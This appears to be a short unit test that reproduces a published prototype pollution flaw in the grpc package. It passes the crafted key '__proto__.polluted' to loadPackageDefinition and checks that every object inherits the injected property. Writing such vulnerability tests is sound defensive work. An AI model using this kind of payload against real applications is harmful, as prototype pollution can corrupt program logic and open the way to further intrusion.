//https://security.snyk.io/vuln/SNYK-JS-GRPCGRPCJS-1038818
test("prototype pollution in x-assign", () => {
  const { loadPackageDefinition } = require("grpc");

  expect({}.polluted).toBe(undefined);

  loadPackageDefinition({ "__proto__.polluted": "yes" });

  expect({}.polluted).toBe("yes");
});
